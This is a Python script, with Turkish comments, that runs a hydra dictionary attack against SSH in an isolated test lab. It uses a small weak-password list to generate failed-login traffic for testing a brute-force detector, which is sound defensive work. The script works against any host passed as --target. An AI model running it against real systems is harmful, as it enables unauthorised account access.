"""SSH Brute-Force Simulasyonu (Issue #8)
============================================
Izole test lab'inda `target` konteynerinin SSH servisine karsi hydra ile
sozluk saldirisi calistirir. `rules-engine/brute_force_detector.py`'nin
tespit etmesi beklenen ardisik basarisiz giris denemesi trafigini uretir.

SADECE izole test lab agi icindir.

Kullanim (attacker konteyneri icinde):
    python3 simulate/brute_force.py --target target --user testuser
"""

from __future__ import annotations

import argparse
import subprocess
from pathlib import Path
from typing import List, Optional

# Gercek parola listesi degil -- testenv/target'taki kasitli zayif
# testuser:123456 hesabini tetiklemek icin kucuk bir sozluk.
DEFAULT_WORDLIST = [
    "123456",
    "password",
    "admin",
    "root",
    "letmein",
    "qwerty",
    "abc123",
    "111111",
    "toor",
]

WORDLIST_PATH = Path("/tmp/brute_force_wordlist.txt")


def _write_wordlist(passwords: List[str]) -> Path:
    WORDLIST_PATH.write_text("\n".join(passwords) + "\n", encoding="utf-8")
    return WORDLIST_PATH


def run_brute_force(
    target: str,
    username: str,
    passwords: Optional[List[str]] = None,
    tasks: int = 4,
) -> subprocess.CompletedProcess:
    """hydra ile SSH'a karsi sozluk saldirisi calistirir."""
    wordlist = _write_wordlist(passwords or DEFAULT_WORDLIST)
    cmd = ["hydra", "-l", username, "-P", str(wordlist), "-t", str(tasks), f"ssh://{target}"]
    return subprocess.run(cmd, check=False, capture_output=True, text=True)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Izole test lab'inda SSH brute-force simulasyonu")
    parser.add_argument("--target", required=True, help="Hedef host/IP (ornek: target)")
    parser.add_argument("--user", default="testuser", help="Denenecek kullanici adi")
    args = parser.parse_args()

    result = run_brute_force(args.target, args.user)
    print(result.stdout)
    print(result.stderr)
